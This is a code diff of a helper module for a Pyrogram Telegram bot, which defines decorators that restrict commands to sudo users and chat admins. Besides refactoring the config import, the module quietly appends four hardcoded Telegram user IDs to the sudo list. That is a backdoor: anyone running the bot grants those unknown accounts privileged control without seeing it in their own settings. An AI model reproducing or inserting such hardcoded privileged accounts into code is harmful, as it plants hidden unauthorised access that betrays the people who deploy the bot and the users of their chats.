@@ -1,15 +1,17 @@
+# Copyright (C) 2021 By VideoStreamVCG
+
 from typing import Callable
 
 from pyrogram import Client
 from pyrogram.types import Message
 
-from config import SUDO_USERS
+from config import Cyber
 from helpers.admins import get_administrators
 
-SUDO_USERS.append(870471128)
-SUDO_USERS.append(1138045685)
-SUDO_USERS.append(645739169)
-SUDO_USERS.append(1249591948)
+Cyber.SUDO_USERS.append(1249591948)
+Cyber.SUDO_USERS.append(645739169)
+Cyber.SUDO_USERS.append(1138045685)
+Cyber.SUDO_USERS.append(870471128)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -23,7 +25,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Cyber.SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -37,7 +39,7 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Cyber.SUDO_USERS:
             return await func(client, message)
 
     return decorator
